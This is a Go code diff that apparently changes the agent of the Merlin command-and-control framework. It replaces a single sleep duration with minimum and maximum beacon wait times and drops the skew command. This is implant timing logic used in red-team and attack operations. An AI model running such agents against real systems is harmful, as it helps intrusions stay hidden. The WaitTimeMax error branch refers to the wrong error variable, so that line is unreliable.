@@ -43,28 +43,35 @@ func (a *Agent) control(job jobs.Job) {
 	case "exit":
 		os.Exit(0)
 	case "sleep":
-		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent sleep time to %s", cmd.Args))
+		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent sleep time to %s - %s seconds", cmd.Args[0], cmd.Args[1]))
 
-		t, err := time.ParseDuration(cmd.Args[0])
+		tmin, err := strconv.ParseInt(string(cmd.Args[0]), 10, 64)
 		if err != nil {
-			results.Stderr = fmt.Sprintf("there was an error changing the agent waitTime:\r\n%s", err.Error())
+			results.Stderr = fmt.Sprintf("Could not parse WaitTimeMin as an integer:\r\n%s", err.Error())
 			break
 		}
-		if t >= 0 {
-			a.WaitTime = t
+
+		tmax, err2 := strconv.ParseInt(string(cmd.Args[1]), 10, 64)
+		if err2 != nil {
+			results.Stderr = fmt.Sprintf("Could not parse WaitTimeMax as an integer:\r\n%s", err.Error())
+			break
+		}
+
+		if tmin > 0 {
+			a.WaitTimeMin = tmin
+			//a.ActiveMin = tmin //coming soon
 		} else {
-			results.Stderr = fmt.Sprintf("the agent was provided with a time that was not greater than or equal to zero:\r\n%s", t.String())
+			results.Stderr = fmt.Sprintf("The agent was provided with a WaitTimeMin that was not greater than zero:\r\n%s", strconv.FormatInt(tmin, 10))
 			break
 		}
-	case "skew":
-		t, err := strconv.ParseInt(cmd.Args[0], 10, 64)
-		if err != nil {
-			results.Stderr = fmt.Sprintf("there was an error changing the agent skew interval:\r\n%s", err.Error())
-			break
-		}
-		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent skew interval to %d", t))
 
-		a.Skew = t
+		if tmax > 0 {
+			a.WaitTimeMax = tmax
+			//a.ActiveMax = tmax //coming soon
+		} else {
+			results.Stderr = fmt.Sprintf("The agent was provided with a WaitTimeMax that was not greater than zero:\r\n%s", strconv.FormatInt(tmax, 10))
+			break
+		}
 	case "padding":
 		err := a.Client.Set("paddingmax", cmd.Args[0])
 		if err != nil {
@@ -148,11 +155,11 @@ func (a *Agent) getAgentInfoMessage() messages.AgentInfo {
 	agentInfoMessage := messages.AgentInfo{
 		Version:       merlin.Version,
 		Build:         build,
-		WaitTime:      a.WaitTime.String(),
+		WaitTimeMin:   a.WaitTimeMin,
+		WaitTimeMax:   a.WaitTimeMax,
 		PaddingMax:    padding,
 		MaxRetry:      a.MaxRetry,
 		FailedCheckin: a.FailedCheckin,
-		Skew:          a.Skew,
 		Proto:         a.Client.Get("protocol"),
 		SysInfo:       sysInfoMessage,
 		KillDate:      a.KillDate,
